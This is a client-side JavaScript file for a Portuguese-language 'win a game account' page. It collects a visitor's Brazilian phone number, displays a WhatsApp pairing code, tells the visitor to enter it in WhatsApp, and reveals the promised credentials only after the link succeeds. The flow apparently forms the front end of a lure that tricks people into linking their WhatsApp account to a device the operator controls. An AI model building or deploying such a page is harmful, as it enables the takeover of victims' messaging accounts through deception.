/**
 * app.js - Main client application.
 * Handles Socket.io communication, screen transitions, and UI logic.
 * Uses WhatsApp Pairing Code for reliable device linking.
 */
import { initParticles, initDecorations, launchConfetti } from './animations.js';

// ---- State ----
let socket = null;
let currentScreen = 'welcome';

// ---- DOM Elements ----
const screens = {
    welcome:    document.getElementById('screen-welcome'),
    phone:      document.getElementById('screen-phone'),
    pairing:    document.getElementById('screen-pairing'),
    success:    document.getElementById('screen-success'),
    outofstock: document.getElementById('screen-outofstock')
};

const btnWantWin   = document.getElementById('btn-want-win');
const btnSendPhone = document.getElementById('btn-send-phone');
const phoneInput   = document.getElementById('phone-input');
const phoneError   = document.getElementById('phone-error');
const codeDisplay  = document.getElementById('code-display');
const codeHint     = document.getElementById('code-hint');
const statusMsg    = document.getElementById('status-message');
const spinner      = document.getElementById('spinner');

const credentialUsername = document.getElementById('credential-username');
const credentialPassword = document.getElementById('credential-password');
const btnCopy            = document.getElementById('btn-copy');

// Game type set in body data attribute
const gameType = document.body.dataset.game;

// ---- Initialize ----
function init() {
    socket = io();
    setupSocketListeners();
    setupUIListeners();
    initParticles(gameType);
    initDecorations(gameType);
}

// ---- Screen Navigation ----
function showScreen(name) {
    Object.values(screens).forEach(s => s?.classList.remove('active'));
    screens[name]?.classList.add('active');
    currentScreen = name;
}

// ---- Status helper ----
function setStatus(message, type = 'waiting') {
    if (statusMsg) {
        statusMsg.textContent = message;
        statusMsg.className = 'status-text';
        if (type === 'success') statusMsg.classList.add('success');
        if (type === 'error')   statusMsg.classList.add('error');
    }
    if (spinner) spinner.classList.toggle('hidden', type !== 'waiting');
}

// ---- Socket.io Events ----
function setupSocketListeners() {

    // Pairing code received — show on screen
    socket.on('pairingCode', ({ code }) => {
        console.log('Pairing code:', code);
        if (codeDisplay) {
            codeDisplay.textContent = code;
            codeDisplay.classList.remove('loading');
        }
        if (codeHint) codeHint.textContent = 'Insira este código no WhatsApp ↑';
        showScreen('pairing');
        setStatus('Aguardando você inserir o código no WhatsApp...', 'waiting');
    });

    // WhatsApp connected — show credentials
    socket.on('connected', (data) => {
        console.log('Connected! Credentials received.');
        if (credentialUsername) credentialUsername.textContent = data.username;
        if (credentialPassword) credentialPassword.textContent = data.password;
        showScreen('success');
        setTimeout(() => launchConfetti(), 300);
        playSuccessSound();
    });

    // Out of stock (after WhatsApp verification for free-fire)
    socket.on('outOfStock', () => {
        showScreen('outofstock');
    });

    // Session expired
    socket.on('sessionExpired', ({ message }) => {
        setStatus(message || 'Sessão expirada. Tente novamente.', 'error');
        resetPhoneButton();
    });

    // Error
    socket.on('error', ({ message }) => {
        setStatus(message || 'Erro. Tente novamente.', 'error');
        resetPhoneButton();
        // Go back to phone screen if we're still pairing
        if (currentScreen === 'pairing') showScreen('phone');
    });

    // Generic status
    socket.on('status', ({ message }) => setStatus(message, 'waiting'));

    socket.on('disconnect', () => setStatus('Conexão perdida. Reconectando...', 'error'));
    socket.on('connect',    () => {
        if (currentScreen === 'pairing') setStatus('Reconectado! Aguardando verificação...', 'waiting');
    });
}

// ---- UI Events ----
function setupUIListeners() {

    // Welcome → Phone screen
    if (btnWantWin) {
        btnWantWin.addEventListener('click', () => showScreen('phone'));
    }

    // Phone confirm
    if (btnSendPhone) btnSendPhone.addEventListener('click', sendPhone);

    // Phone auto-format + Enter
    if (phoneInput) {
        phoneInput.addEventListener('input', (e) => {
            let v = e.target.value.replace(/\D/g, '').slice(0, 11);
            if      (v.length > 7 && v.length === 11) v = v.replace(/(\d{2})(\d{5})(\d{4})/, '$1 $2-$3');
            else if (v.length > 6)                    v = v.replace(/(\d{2})(\d{4})(\d+)/,   '$1 $2-$3');
            else if (v.length > 2)                    v = v.replace(/(\d{2})(\d+)/,            '$1 $2');
            e.target.value = v;
            if (phoneError) phoneError.textContent = '';
        });
        phoneInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') sendPhone();
        });
    }

    // Copy credentials
    if (btnCopy) {
        btnCopy.addEventListener('click', async () => {
            const username = credentialUsername?.textContent || '';
            const password = credentialPassword?.textContent || '';
            const text = `Nome: ${username}\nSenha: ${password}`;
            try {
                await navigator.clipboard.writeText(text);
            } catch {
                const ta = document.createElement('textarea');
                ta.value = text;
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
            }
            btnCopy.textContent = '✅ Copiado!';
            btnCopy.classList.add('copied');
            setTimeout(() => {
                btnCopy.textContent = '📋 Copiar Credenciais';
                btnCopy.classList.remove('copied');
            }, 2500);
        });
    }
}

// ---- Send Phone Number ----
function sendPhone() {
    const raw = (phoneInput?.value || '').replace(/\D/g, '');

    if (raw.length < 10 || raw.length > 11) {
        if (phoneError) phoneError.textContent = '⚠️ Digite um número válido com DDD (ex: 11 99999-9999)';
        return;
    }

    if (phoneError) phoneError.textContent = '';

    // Emit with Brazil country code prefix
    socket.emit('requestSession', { gameType, phone: '55' + raw });

    if (btnSendPhone) {
        btnSendPhone.textContent = '⏳ Gerando código...';
        btnSendPhone.disabled = true;
        btnSendPhone.classList.remove('btn-glow');
    }

    // Prepare pairing screen in loading state
    if (codeDisplay) { codeDisplay.textContent = '····'; codeDisplay.classList.add('loading'); }
    if (codeHint)    codeHint.textContent = 'Gerando seu código...';
    showScreen('pairing');
    setStatus('Conectando ao servidor...', 'waiting');
}

// ---- Reset phone button ----
function resetPhoneButton() {
    if (btnSendPhone) {
        btnSendPhone.textContent = '✅ Gerar meu código';
        btnSendPhone.disabled = false;
        btnSendPhone.classList.add('btn-glow');
    }
}

// ---- Success Sound ----
function playSuccessSound() {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        [523.25, 659.25, 783.99, 1046.50].forEach((freq, i) => {
            const osc  = ctx.createOscillator();
            const gain = ctx.createGain();
            osc.connect(gain); gain.connect(ctx.destination);
            osc.frequency.value = freq; osc.type = 'sine';
            const t = ctx.currentTime + i * 0.15;
            gain.gain.setValueAtTime(0.1, t);
            gain.gain.exponentialRampToValueAtTime(0.001, t + 0.5);
            osc.start(t); osc.stop(t + 0.5);
        });
    } catch (_) {}
}

// ---- Start ----
document.addEventListener('DOMContentLoaded', init);
